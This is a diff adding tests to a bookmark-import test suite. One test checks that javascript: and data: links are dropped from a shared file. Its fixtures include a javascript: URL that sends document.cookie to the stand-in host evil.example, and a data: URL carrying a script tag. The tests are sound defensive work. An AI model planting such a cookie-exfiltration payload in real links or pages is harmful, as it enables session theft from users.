@@ -180,6 +180,15 @@ describe("bookmark import", () => {
       expect(plan.duplicate).toBe(1);
     });
 
+    it("drops javascript: and data: links from a shared file", () => {
+      const plan = planBookmarkImport([], [
+        { title: "Prize", url: "javascript:fetch('//evil.example?c='+document.cookie)" },
+        { title: "Page", url: "data:text/html,<script>alert(1)</script>" },
+        { title: "Real", url: "https://real.example" },
+      ]);
+      expect(plan.additions.map((b) => b.url)).toEqual(["https://real.example"]);
+    });
+
     it("dedupes within the file too", () => {
       const plan = planBookmarkImport([], [
         { title: "One", url: "https://same.example" },
@@ -448,6 +457,16 @@ describe("HTML import builds the folder tree", () => {
         result.current.bookmarks.map((b) => [b.title, nameOf(b.folderId)])
       );
       expect(where).toEqual({ Jira: "Work", News: "Bar", Loose: null });
+    });
+
+    // A Raindrop favourite arrives pinned; a link with no favourite flag does not.
+    it("keeps a favourite pinned", () => {
+      const plan = planHtmlImport([], [], [
+        { ...parsed("Fav", []), pinned: true },
+        parsed("Plain", []),
+      ]);
+      const pin = Object.fromEntries(plan.additions.map((b) => [b.title, Boolean(b.pinned)]));
+      expect(pin).toEqual({ Fav: true, Plain: false });
     });
 
     it("creates no folder for links it skips as duplicates", () => {
